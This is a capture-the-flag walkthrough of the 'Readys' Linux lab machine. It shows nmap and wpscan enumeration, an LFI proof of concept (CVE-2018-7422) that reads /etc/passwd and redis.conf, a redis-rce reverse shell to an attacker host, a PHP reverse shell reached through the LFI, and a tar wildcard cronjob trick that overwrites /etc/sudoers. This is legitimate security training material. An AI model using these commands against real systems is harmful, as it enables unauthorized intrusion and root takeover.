---
title: Readys PGP walkthrough
description: Target - Readys, OS - Linux, Difficulty - Very Hard
readTime: 20 min read
image: ../assets/images/readys/rde.png
date: 12-30-2025
---


#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -n  -p- -T4 --open -Pn 192.168.231.166 -oN Readys-nmap

Nmap scan report for 192.168.231.166
Host is up (0.32s latency).
Not shown: 65306 closed tcp ports (reset), 226 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (/1dragon/assets/images/readys/protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
|_http-title: Readys &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Discovered port 80 was running a  site with WordPress 5.7.2.
Port 6379 was running Redis Instance.

Browsed the site and it functions. It was a basic site with message posts.
![web-page](/1dragon/assets/images/readys/Pasted%20image%2020251229070417.png)

Enumerated further with wp-scan to discovered vulnerable themes, plugins  etc; because the site was build using Wordpress.

`wpscan --url http://192.168.224.166/ `

while the scan results identified many themes in use that were outdated but the plugin identified was vulnerable. A web search about site-editor version 1.1.1 revealed it has a CVE-2018-7422. .

![](/1dragon/assets/images/readys/Pasted%20image%2020251229235358.png)


The WordPress Site Editor plugin version 1.1.1 is affected by a critical Local File Inclusion (LFI) vulnerability.

![](/1dragon/assets/images/readys/Pasted%20image%2020251229235358.png)

Searchsploit had an exploit  for this plugin version.

![srch](/1dragon/assets/images/readys/Pasted%20image%2020251230000135.png)

The POC 

```
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

---
#### ***Initial Access***

Since there was  a Redis instance up and running on port 6379 tried to get the redis.conf file.
The redis.conf file can be found under `/etc/redis/redis.conf`

Used the plugin exploit to retrieve the redis.conf file and stored it in a file using curl.

```
curl http://192.168.224.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf > redis.conf

```

Analyzed the redis.conf file and discovered that requirepass has the actuall password used by redis server.

![require](/1dragon/assets/images/readys/Pasted%20image%2020251229082602.png)
Found the redis server password to be `Ready4Redis?`

![red-conf](/1dragon/assets/images/readys/Pasted%20image%2020251229082432.png)

Using redis-cli or There is an exploit for redis [redis rec](https://github.com/Ridter/redis-rce?tab=readme-ov-file) with the discovered redis password RCE with reverse shell was achieved.

```
python3 redis-rce.py --rhost 192.168.224.166 --rport 6379 --lhost 192.168.45.191 --lport 4444  -f exp.so --a 'Ready4Redis?' --v
```

![exp](/1dragon/assets/images/readys/Pasted%20image%2020251229085148.png)
Selected the reverse shell option

![revshell](/1dragon/assets/images/readys/Pasted%20image%2020251229085040.png)

Captured the shell as user redis.

---
#### ***Privilege Escalation***

After internal enumeration found that a cronjob runs every 3 minutes by root user.

![cron](/1dragon/assets/images/readys/Pasted%20image%2020251229085500.png)

The cronjob run the script at `/usr/local/bin/backup.sh `

![bcksh](/1dragon/assets/images/readys/Pasted%20image%2020251229085631.png)
The script checks for any file changes every 3 mins in `/var/www/html`

To place a anyfile under /var/ww/html the redis user permission was denied. There exist user Alice.

![Alice](/1dragon/assets/images/readys/Pasted%20image%2020251230003558.png)
Before escalating into Alice user need to place a reverse shell whereit will be executed by Alice.
Further discovered that for redis user `/run/redis` directory is writable hence, transferred a reverse shell to target system.

![revsh](/1dragon/assets/images/readys/Pasted%20image%2020251229092207.png)

Once again used the LFI vulnerability to access the reverse shell placed under `/run/redis/`

```
curl http://192.168.224.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/run/redis/rev.php
```

Captured the shell as Alice user.

![Alice-shell](/1dragon/assets/images/readys/Pasted%20image%2020251229092142.png)

Got the local.txt under Alice home directory

![local](/1dragon/assets/images/readys/Pasted%20image%2020251230004200.png)

As discovered earlier the cronjob that runs the backup.sh script takes backup of `/var/www/html` using tar * wildcard.

Hence made checkpoints and actions that gets executed whenever the cronjob runs. The --checkpoint in tar makes the action execute the exploit.sh which contain 

`echo 'Alice ALL=(root) NOPASSWD: ALL' > /etc/sudoers`
Created  the exploit file that adds Alice user to sudoers list at local and transferred it to target system under `/var/www/html` and `chmod +x exploit.sh` made it executable.

After 3 minutes the cronjob ran and user Alice was added to sudoer list.
Executed `sudo su` and got the shell as root user.
Captured the root flag under /root/proof.txt

![exp](/1dragon/assets/images/readys/Pasted%20image%2020251229222643.png)

---



										Target compromised - |^| ^ ( |< 3 D